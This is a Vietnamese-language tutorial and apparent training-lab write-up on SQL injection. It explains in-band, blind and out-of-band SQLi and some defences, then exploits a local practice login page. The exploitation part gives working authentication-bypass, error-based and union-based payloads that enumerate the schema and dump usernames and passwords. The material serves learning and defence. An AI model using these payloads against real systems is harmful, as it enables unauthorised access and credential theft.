# Tìm hiểu SQL injection
## 1. SQL injection là gì?

SQL injection (SQLi) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các truy vấn mà ứng dụng thực hiện đối với cơ sở dữ liệu. 
Với SQL injection, hacker có thể truy cập một phần hoặc toàn bộ dữ liệu trong hệ thống. Trong nhiều trường hợp, hacker không chỉ đọc được dữ liệu mà còn có thể chỉnh sửa dữ liệu. Lúc này hacker có thể đăng nhập dưới vai trò admin, lợi dụng hệ thống, hoặc xoá toàn bộ dữ liệu khiến hệ thống ngừng hoạt động.

## 2. Các dạng tấn công SQL injection

![](https://i.imgur.com/jIHZycb.png)

### 2.1. In-band SQLi

In-band SQL injection là kiểu tấn công SQL injection phổ biến và dễ khai thác nhất. In-band SQLi xảy ra khi kẻ tấn công sử dụng cùng một kênh liên lạc để khởi động các cuộc tấn công và thu thập kết quả. 
Hai loại phổ biến nhất của In-band SQLi là Error-based SQLi và Union-based SQLi.
* Error-based: kẻ tấn công thực hiện inject các câu truy vấn lỗi thông qua input, sau đó dựa vào những thông báo lỗi này để thu thập thông tin về cấu trúc DB.
* Union-based: kẻ tấn công lợi dụng toán tử UNION để thu thập thông tin về DB.

### 2.2. Inferential (Blind) SQLi

Thông tin về cơ sở dữ liệu không được hiển thị với người dùng nên kẻ tấn công phải gửi payload và thu thập thông tin thông qua các response.
Blind SQLi thường mất nhiều thời gian để khai thác hơn các dạng SQLi khác.
Có hai loại Blind SQLi là Time-based và Boolean-based.
* Time-based: Hacker sẽ gửi một truy vấn SQL, làm cho DB đợi (trong vài giây) trước khi có thể hoạt động. Sau đó, hacker có thể xem thời gian DB cần để phản hồi, một truy vấn là đúng hay sai. Dựa trên kết quả, một HTTP repsonse sẽ được tạo ra. Vì vậy hacker có thể tìm ra thông báo mà chúng đã sử dụng trả về đúng hay sai, không cần dựa vào dữ liệu từ DB.
* Boolean-based: Hacker gửi một truy vấn SQL đến DB, làm ứng dụng trả về một kết quả. Kết quả có thể khác nhau tùy vào truy vấn đúng hay sai. Dựa vào đó, kẻ tấn công điều chỉnh câu truy vấn để khai thác.

### 2.3. Out-of-band SQLi
 
Out-of-band SQL Injection không phổ biến lắm, chủ yếu là do nó phụ thuộc vào các tính năng được bật trên máy chủ cơ sở dữ liệu đang được ứng dụng web sử dụng.
Phương thức tấn công này sử dụng một cấu trúc truy vấn SQL để yêu cầu sever trả về kết quả thông qua các kênh liên quan đến mạng.

## 3. Cách phòng chống SQLi

* **Lọc dữ liệu từ người dùng:** Ta sử dụng filter để lọc các kí tự đặc biệt (; ” ‘) hoặc các từ khoá (SELECT, UNION) do người dùng nhập vào. 
* **Không cộng chuỗi để tạo SQL:** Sử dụng parameter thay vì cộng chuỗi. 
* **Không hiển thị exception, message lỗi:** Hacker dựa vào message lỗi để tìm ra cấu trúc database. Khi có lỗi, ta chỉ hiện thông báo lỗi chứ đừng hiển thị đầy đủ thông tin về lỗi, tránh hacker lợi dụng.
* **Phân quyền rõ ràng trong DB:** Nếu chỉ truy cập dữ liệu từ một số bảng, nên tạo một account trong DB và gán quyền truy cập cho account đó. Lúc này, dù hacker có inject được sql cũng không thể đọc dữ liệu từ các bảng chính, sửa hay xoá dữ liệu.
* **Backup dữ liệu thường xuyên:** Dữ liệu phải thường xuyên được backup để nếu có bị hacker xoá thì ta vẫn có thể khôi phục được. 

___

# Khai thác SQL injection

## 1. Khai thác Error-based 

Khi nhập `' OR 1=1 -- ` vào ô username, em nhận được thông báo đăng nhập thành công nên ở đây dính SQLi.

![](https://i.imgur.com/9G1I2t0.png)

Khi nhập vào đây một câu truy vấn lỗi syntax thì sẽ có thông báo lỗi hiện ra. Đây là dấu hiệu của error-based.

![](https://i.imgur.com/cJjElxV.png)

Để lấy được tên cơ sở dữ liệu, em tạo ra một payload dựa trên `Duplicate entry for key 'group_key'`. 

**Payload:**`' or 1=1 group by concat(database(),'-', floor(rand(0)*2)) having min(0)-- `

`floor(rand(0)*2)`: Sinh ra 0 hoặc 1 để nối với tên database phía trước. Điều này chắc chắn tạo ra một group_key bị trùng, chậm nhất là ở lần thứ ba.

![](https://i.imgur.com/dhSyED7.png)

Như vậy, em tìm được tên cơ sở dữ liệu là `kcsc`.
Lúc này, em tạo một payload tương tự để tìm tên bảng.

**Payload:** `' or 1=1 group by concat((select table_name from information_schema.tables where table_schema='kcsc'),'-',floor(rand(0)*2)) having min(0)-- `

![](https://i.imgur.com/kWFYSdV.png)

Ở đây, em thấy xuất hiện lỗi `Subquery returns more than 1 row in C:\xampp\htdocs\KCSC-train\task_1\login.php:28`. Điều này do cơ sở dữ liệu có nhiều hơn 1 bảng. Vậy để tìm ra tên bảng, em cần thêm `limit 0,1` vào payload để lấy ra tên bảng đầu tiên trong DB.

**Payload:** `' or 1=1 group by concat((select table_name from information_schema.tables where table_schema='kcsc' limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `

![](https://i.imgur.com/G9WyOX4.png)

Ở đây, em biết được tên bảng đầu tiên là `task1`.
Tương tự, thay `limit 1,1`, em có tên bảng thứ hai là `upload`. 
Tăng lên `limit 2,1` em thấy không hiển thị lỗi nữa. Vậy DB này có 2 bảng là `task1` và `upload`. 
Tiếp theo, em khai thác thông tin ở bảng `task1`.
Bằng cách như trên, em cũng tìm ra được tên các cột trong bảng.

**Payload:** `' or 1=1 group by concat((select column_name from information_schema.columns where table_name='task1' limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `.

![](https://i.imgur.com/h9UAKCh.png)

![](https://i.imgur.com/AxIr78R.png)

![](https://i.imgur.com/BUQ2qvP.png)

Vậy bảng `task1` có 3 cột lần lượt là: `id`, `username`, `password`.
Bây giờ, để lấy dữ liệu từ bảng, em truyền payload như sau:

**Payload lấy id:**`' or 1=1 group by concat((select id from task1 limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `

**Payload lấy username:**`' or 1=1 group by concat((select username from task1 limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `

**Payload lấy password:**`' or 1=1 group by concat((select password from task1 limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `
![](https://i.imgur.com/IFG4Swc.png)

![](https://i.imgur.com/U32xc1N.png)

![](https://i.imgur.com/68b7wch.png)

Em đã có được thông tin người dùng đầu tiên như sau:
> id: 22

> username: Cuc

> password: cuc

Muốn lấy thông tin những người dùng còn lại, ta làm tương tự như trên và thay bằng `limit 1,1`, `limit 2,1`,...

## 2.2. Khai thác Union-based

Tương tự như Error-based, em biết ô username dính SQLi.
Với Union-based, đầu tiên, em tìm số cột trong bảng bằng cách truyền payload `' OR 1=1 ORDER BY 1 -- ` vào ô `username`.

![](https://i.imgur.com/AzNOPNV.png)

Tăng lên bằng `ORDER BY 2`, `ORDER BY 3`, ta được kết quả tương tự như trên.
Với `ORDER BY 4`, em thấy thông báo lỗi `Unknown column '4' `.

![](https://i.imgur.com/vCTD4H1.png)

Vậy truy vấn trả về 3 cột.
Tiếp theo, em tìm cột hữu dụng với payload `' UNION SELECT 'a','b','c' -- ` thì thu được kết quả sau:

![](https://i.imgur.com/730i3Qp.png)

Vậy dữ liệu hiện ra được truy xuất từ cột thứ 2 trong bảng.

Với `' UNION SELECT 1,database(),3 --`, em tìm được tên cơ sở dữ liệu là `kcsc`.

![](https://i.imgur.com/K6uLx4i.png)

Với `' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='kcsc'-- `, em có tên bảng là `task1` và `upload`.

![](https://i.imgur.com/DwlC56P.png)

Tương tự, để tìm tên các cột, em truyền vào payload `' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='task1'-- `.

![](https://i.imgur.com/tfZhNq9.png)

Vậy bảng `task1` có 3 cột là `id`, `username` và `password`.

Bây giờ, để truy xuất dữ liệu người dùng, em sử dụng payload như sau:

`' UNION SELECT 1,GROUP_CONCAT(CONCAT(id,'~',username,'~',password)),3 FROM task1 -- `

![](https://i.imgur.com/e1GacrZ.png)